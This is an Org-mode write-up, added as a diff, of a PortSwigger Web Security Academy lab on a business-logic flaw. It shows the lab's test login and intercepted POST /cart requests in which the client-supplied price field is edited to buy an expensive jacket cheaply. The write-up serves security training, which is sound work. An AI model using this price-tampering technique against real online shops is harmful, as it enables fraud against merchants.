@@ -1,0 +1,58 @@
+#+title: Excessive trust in client side controls
+#+author: [[https://github.com/touhidulshawan][Touhidul Shawan]]
+#+description: Bussiness Logic Vulnerabilities Labs from Portswigger
+#+date: 2023-08-20 Sun
+#+options: toc:2
+
+* Table of Contents :toc:
+- [[#lab-contain][Lab contain]]
+  - [[#test-account][Test account]]
+- [[#end-goal][End Goal]]
+- [[#exploit][Exploit]]
+
+* Lab contain
+- Doesn't validate user input
+- Logic flow on purchasing workflow
+** Test account
+       - username: =wiener=
+       - password: =peter=
+* End Goal
+- Solve lab by buying a "Lightweight 133t leather jacket"
+* Exploit
+- Access the lab
+- Login with [[#test-account][Test account]] crediential
+- Buy a lowest price item on cart to observe the workflow
+- Add =product= to cart request
+#+begin_src 
+POST /cart HTTP/2
+Host: 0aa6003c034fece4832e7144009400d8.web-security-academy.net
+Cookie: session=QSZYFdktpu3d5yY8Us07mHuHmhFW8wJ2
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/116.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 46
+Origin: https://0aa6003c034fece4832e7144009400d8.web-security-academy.net
+Referer: https://0aa6003c034fece4832e7144009400d8.web-security-academy.net/product?productId=2
+
+productId=2&redir=PRODUCT&quantity=1&price=705
+#+end_src
+
+- Now add our target product to cart and intercept that request
+#+begin_src 
+POST /cart HTTP/2
+Host: 0aa6003c034fece4832e7144009400d8.web-security-academy.net
+Cookie: session=QSZYFdktpu3d5yY8Us07mHuHmhFW8wJ2
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/116.0
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 49
+Origin: https://0aa6003c034fece4832e7144009400d8.web-security-academy.net
+Referer: https://0aa6003c034fece4832e7144009400d8.web-security-academy.net/product?productId=1
+
+productId=1&redir=PRODUCT&quantity=1&price=133700
+#+end_src
+
+Here change the =price= to lowest and resubmit it. Go to cart and see that price has been reset to your number. Buy that to solve the lab
+
+
